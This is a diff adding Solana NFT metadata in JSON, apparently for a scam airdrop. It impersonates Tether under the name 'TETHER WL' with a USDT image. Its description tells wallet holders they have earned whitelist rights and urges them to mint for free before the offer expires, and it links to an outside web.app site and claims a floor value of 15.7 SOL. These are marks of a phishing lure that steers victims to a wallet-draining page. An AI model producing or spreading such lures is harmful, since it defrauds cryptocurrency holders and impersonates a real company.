@@ -1,0 +1,39 @@
+{
+  "name": "TETHER WL",
+  "symbol": "TETHER",
+  "description": "Solana's Cutest Ambassador!\nCongratulations. Your wallet address has earned WhiteList rights.\nMint for free now before your mint expires.👇",
+  "seller_fee_basis_points": 100,
+  "external_url": "https://tether-nft.web.app",
+  "edition": "Alpha",
+  "background_color": "000000",
+  "attributes": [
+    {
+      "trait_type": "Floor",
+      "value": "15.7 SOL"
+    },
+    {
+      "trait_type": "White List",
+      "value": "Free"
+    }
+  ],
+  "properties": {
+    "category": "image",
+    "creators": [
+      {
+        "address": "CirbJ1nD2hxxicyhQDnBQfCx7WyiPupkEySTKfYMypfF",
+        "share": 100
+      }
+    ],
+    "files": [
+      {
+        "uri": "https://raw.githubusercontent.com/holydiamonds/nftfiles/main/usdt.png",
+        "file_type": "image/gif"
+      }
+    ]
+  },
+  "collection": {
+    "name": "TETHER",
+    "family": "WhiteList"
+  },
+  "image": "https://raw.githubusercontent.com/holydiamonds/nftfiles/main/usdt.png"
+}
